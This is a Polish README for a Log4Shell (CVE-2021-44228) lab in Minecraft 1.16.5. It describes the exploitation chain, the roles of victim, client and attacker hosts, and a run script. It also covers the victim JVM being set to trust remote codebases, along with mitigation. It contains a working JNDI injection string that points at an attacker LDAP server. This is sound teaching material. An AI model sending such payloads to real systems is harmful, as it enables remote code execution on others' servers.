# Scenariusz lab — Log4Shell (CVE-2021-44228)

## Cel

Łańcuch: input → Log4j lookup → LDAP → HTTP `.class` → kod w JVM ofiary,
oraz mitygacja. Minecraft 1.16.5 to kontekst; automatyczny PoC używa
`VulnerableLogger` z Log4j 2.14.1.

## Role

| Rola | Adres | Składniki |
|------|-------|-----------|
| victim / mc-server | 10.42.0.10 / localhost | JDK11, Log4j 2.14.1 / MC 1.16.5 |
| mc-client | 10.42.0.20 | klient MC 1.16.5 |
| attacker | 10.42.0.30 / localhost | marshalsec :1389, HTTP :8888, listener :4444 |

## Przebieg

```bash
nix develop -c ./scripts/run-full-lab.sh
```

Opcjonalnie: `./scripts/start-mc-server.sh` + czat z klienta
(`${jndi:ldap://127.0.0.1:1389/Exploit}`).

Na JVM ofiary ustawiane jest `trustURLCodebase=true` (domyślnie od JDK 8u191
zdalne codebase jest wyłączone).

Payload labowy: `evidence/pwned.txt` + baner na listenerze.
